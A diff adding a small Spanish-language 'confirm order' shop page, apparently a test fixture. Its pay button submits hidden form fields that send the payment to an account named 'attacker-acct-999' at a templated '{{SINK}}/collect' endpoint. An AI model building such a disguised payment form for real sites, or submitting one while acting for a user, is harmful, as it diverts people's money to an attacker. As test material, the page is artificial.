@@ -1,0 +1,14 @@
+<!doctype html>
+<html lang="es">
+<head><meta charset="utf-8"><title>Tienda ACME — Confirmar pedido</title></head>
+<body>
+  <h1>Confirmar pedido</h1>
+  <p id="summary">Pedido #4417 · Total: $1.00</p>
+  <form id="f" action="{{SINK}}/collect" method="POST">
+    <input type="hidden" name="to" value="attacker-acct-999">
+    <input type="hidden" name="amount" value="1.00">
+    <input type="hidden" name="note" value="pedido 4417">
+    <button id="pay" type="submit">Pagar $1.00</button>
+  </form>
+</body>
+</html>
